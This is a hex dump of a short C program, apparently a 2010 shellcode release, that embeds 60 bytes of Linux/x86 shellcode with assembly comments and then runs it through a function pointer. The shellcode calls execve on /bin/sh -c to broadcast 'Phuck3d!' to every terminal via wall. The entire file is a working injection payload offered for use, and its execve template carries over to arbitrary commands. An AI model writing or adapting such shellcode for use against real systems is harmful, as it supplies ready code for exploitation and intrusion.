00000000  2f 2a 0a 20 0a 24 49 64  3a 20 77 68 65 72 65 2d  |/*. .$Id: where-|
00000010  69 73 2d 77 61 6c 6c 69  65 2e 63 2c 20 76 20 31  |is-wallie.c, v 1|
00000020  2e 30 20 32 30 31 30 2f  30 34 2f 32 34 20 31 38  |.0 2010/04/24 18|
00000030  3a 33 32 3a 32 39 20 63  6f 6e 64 69 73 20 45 78  |:32:29 condis Ex|
00000040  70 20 24 0a 20 0a 6c 69  6e 75 78 2f 78 38 36 20  |p $. .linux/x86 |
00000050  73 65 6e 64 73 20 22 50  68 75 63 6b 33 64 21 22  |sends "Phuck3d!"|
00000060  20 74 6f 20 61 6c 6c 20  74 65 72 6d 69 6e 61 6c  | to all terminal|
00000070  73 20 28 36 30 20 62 79  74 65 73 29 20 73 68 65  |s (60 bytes) she|
00000080  6c 6c 63 6f 64 65 0a 62  79 20 63 6f 6e 64 69 73  |llcode.by condis|
00000090  0a 20 0a 54 65 73 74 65  64 20 6f 6e 3a 20 4c 69  |. .Tested on: Li|
000000a0  6e 75 78 20 44 65 62 69  61 6e 0a 20 0a 2a 2f 0a  |nux Debian. .*/.|
000000b0  20 0a 69 6e 74 20 6d 61  69 6e 28 76 6f 69 64 29  | .int main(void)|
000000c0  0a 7b 0a 20 20 20 20 63  68 61 72 20 65 76 69 6c  |.{.    char evil|
000000d0  5b 5d 20 3d 20 20 0a 20  0a 20 20 20 20 20 20 20  |[] =  . .       |
000000e0  20 22 5c 78 36 61 5c 78  30 62 22 20 20 20 20 20  | "\x6a\x0b"     |
000000f0  20 20 20 20 20 20 20 20  20 2f 2f 20 70 75 73 68  |         // push|
00000100  20 20 20 24 30 78 62 0a  20 20 20 20 20 20 20 20  |   $0xb.        |
00000110  22 5c 78 35 38 22 20 20  20 20 20 20 20 20 20 20  |"\x58"          |
00000120  20 20 20 20 20 20 20 20  2f 2f 20 70 6f 70 20 20  |        // pop  |
00000130  20 20 25 65 61 78 0a 20  20 20 20 20 20 20 20 22  |  %eax.        "|
00000140  5c 78 39 39 22 20 20 20  20 20 20 20 20 20 20 20  |\x99"           |
00000150  20 20 20 20 20 20 20 2f  2f 20 63 6c 74 64 0a 20  |       // cltd. |
00000160  20 20 20 20 20 20 20 22  5c 78 35 32 22 20 20 20  |       "\x52"   |
00000170  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 2f  |               /|
00000180  2f 20 70 75 73 68 20 20  20 25 65 64 78 0a 20 20  |/ push   %edx.  |
00000190  20 20 20 20 20 20 22 5c  78 36 38 5c 78 37 37 5c  |      "\x68\x77\|
000001a0  78 36 31 5c 78 36 63 5c  78 36 63 22 20 20 2f 2f  |x61\x6c\x6c"  //|
000001b0  20 70 75 73 68 20 20 20  24 30 78 36 63 36 63 36  | push   $0x6c6c6|
000001c0  31 37 37 0a 20 20 20 20  20 20 20 20 22 5c 78 36  |177.        "\x6|
000001d0  38 5c 78 32 31 5c 78 32  30 5c 78 37 63 5c 78 32  |8\x21\x20\x7c\x2|
000001e0  30 22 20 20 2f 2f 20 70  75 73 68 20 20 20 24 30  |0"  // push   $0|
000001f0  78 32 30 37 63 32 30 32  31 0a 20 20 20 20 20 20  |x207c2021.      |
00000200  20 20 22 5c 78 36 38 5c  78 36 33 5c 78 36 62 5c  |  "\x68\x63\x6b\|
00000210  78 33 33 5c 78 36 34 22  20 20 2f 2f 20 70 75 73  |x33\x64"  // pus|
00000220  68 20 20 20 24 30 78 36  34 33 33 36 62 36 33 0a  |h   $0x64336b63.|
00000230  20 20 20 20 20 20 20 20  22 5c 78 36 38 5c 78 32  |        "\x68\x2|
00000240  30 5c 78 35 30 5c 78 36  38 5c 78 37 35 22 20 20  |0\x50\x68\x75"  |
00000250  2f 2f 20 70 75 73 68 20  20 20 24 30 78 37 35 36  |// push   $0x756|
00000260  38 35 30 32 30 0a 20 20  20 20 20 20 20 20 22 5c  |85020.        "\|
00000270  78 36 38 5c 78 36 35 5c  78 36 33 5c 78 36 38 5c  |x68\x65\x63\x68\|
00000280  78 36 66 22 20 20 2f 2f  20 70 75 73 68 20 20 20  |x6f"  // push   |
00000290  24 30 78 36 66 36 38 36  33 36 35 0a 20 20 20 20  |$0x6f686365.    |
000002a0  20 20 20 20 22 5c 78 38  39 5c 78 65 36 22 20 20  |    "\x89\xe6"  |
000002b0  20 20 20 20 20 20 20 20  20 20 20 20 2f 2f 20 6d  |            // m|
000002c0  6f 76 20 20 20 20 25 65  73 70 2c 25 65 73 69 0a  |ov    %esp,%esi.|
000002d0  20 20 20 20 20 20 20 20  22 5c 78 35 32 22 20 20  |        "\x52"  |
000002e0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000002f0  2f 2f 20 70 75 73 68 20  20 20 25 65 64 78 0a 20  |// push   %edx. |
00000300  20 20 20 20 20 20 20 22  5c 78 36 36 5c 78 36 38  |       "\x66\x68|
00000310  5c 78 32 64 5c 78 36 33  22 20 20 20 20 20 20 2f  |\x2d\x63"      /|
00000320  2f 20 70 75 73 68 77 20  20 24 30 78 36 33 32 64  |/ pushw  $0x632d|
00000330  0a 20 20 20 20 20 20 20  20 22 5c 78 38 39 5c 78  |.        "\x89\x|
00000340  65 31 22 20 20 20 20 20  20 20 20 20 20 20 20 20  |e1"             |
00000350  20 2f 2f 20 6d 6f 76 20  20 20 20 25 65 73 70 2c  | // mov    %esp,|
00000360  25 65 63 78 0a 20 20 20  20 20 20 20 20 22 5c 78  |%ecx.        "\x|
00000370  35 32 22 20 20 20 20 20  20 20 20 20 20 20 20 20  |52"             |
00000380  20 20 20 20 20 2f 2f 20  70 75 73 68 20 20 20 25  |     // push   %|
00000390  65 64 78 0a 20 20 20 20  20 20 20 20 22 5c 78 36  |edx.        "\x6|
000003a0  38 5c 78 32 66 5c 78 32  66 5c 78 37 33 5c 78 36  |8\x2f\x2f\x73\x6|
000003b0  38 22 20 20 2f 2f 20 70  75 73 68 20 20 20 24 30  |8"  // push   $0|
000003c0  78 36 38 37 33 32 66 32  66 0a 20 20 20 20 20 20  |x68732f2f.      |
000003d0  20 20 22 5c 78 36 38 5c  78 32 66 5c 78 36 32 5c  |  "\x68\x2f\x62\|
000003e0  78 36 39 5c 78 36 65 22  20 20 2f 2f 20 70 75 73  |x69\x6e"  // pus|
000003f0  68 20 20 20 24 30 78 36  65 36 39 36 32 32 66 0a  |h   $0x6e69622f.|
00000400  20 20 20 20 20 20 20 20  22 5c 78 38 39 5c 78 65  |        "\x89\xe|
00000410  33 22 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |3"              |
00000420  2f 2f 20 6d 6f 76 20 20  20 20 25 65 73 70 2c 25  |// mov    %esp,%|
00000430  65 62 78 0a 20 20 20 20  20 20 20 20 22 5c 78 35  |ebx.        "\x5|
00000440  32 22 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |2"              |
00000450  20 20 20 20 2f 2f 20 70  75 73 68 20 20 20 25 65  |    // push   %e|
00000460  64 78 0a 20 20 20 20 20  20 20 20 22 5c 78 35 36  |dx.        "\x56|
00000470  22 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |"               |
00000480  20 20 20 2f 2f 20 70 75  73 68 20 20 20 25 65 73  |   // push   %es|
00000490  69 0a 20 20 20 20 20 20  20 20 22 5c 78 35 31 22  |i.        "\x51"|
000004a0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000004b0  20 20 2f 2f 20 70 75 73  68 20 20 20 25 65 63 78  |  // push   %ecx|
000004c0  0a 20 20 20 20 20 20 20  20 22 5c 78 35 33 22 20  |.        "\x53" |
000004d0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000004e0  20 2f 2f 20 70 75 73 68  20 20 20 25 65 62 78 0a  | // push   %ebx.|
000004f0  20 20 20 20 20 20 20 20  22 5c 78 38 39 5c 78 65  |        "\x89\xe|
00000500  31 22 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |1"              |
00000510  2f 2f 20 6d 6f 76 20 20  20 20 25 65 73 70 2c 25  |// mov    %esp,%|
00000520  65 63 78 0a 20 20 20 20  20 20 20 20 22 5c 78 63  |ecx.        "\xc|
00000530  64 5c 78 38 30 22 20 20  20 20 20 20 20 20 20 20  |d\x80"          |
00000540  20 20 20 20 2f 2f 20 69  6e 74 20 20 20 20 24 30  |    // int    $0|
00000550  78 38 30 0a 20 0a 20 0a  20 20 20 20 76 6f 69 64  |x80. . .    void|
00000560  28 2a 62 6f 6f 6d 29 28  29 3d 28 76 6f 69 64 2a  |(*boom)()=(void*|
00000570  29 65 76 69 6c 3b 0a 20  20 20 20 62 6f 6f 6d 28  |)evil;.    boom(|
00000580  29 3b 0a 20 0a 20 20 20  20 72 65 74 75 72 6e 20  |);. .    return |
00000590  30 3b 0a 7d                                       |0;.}|
00000594
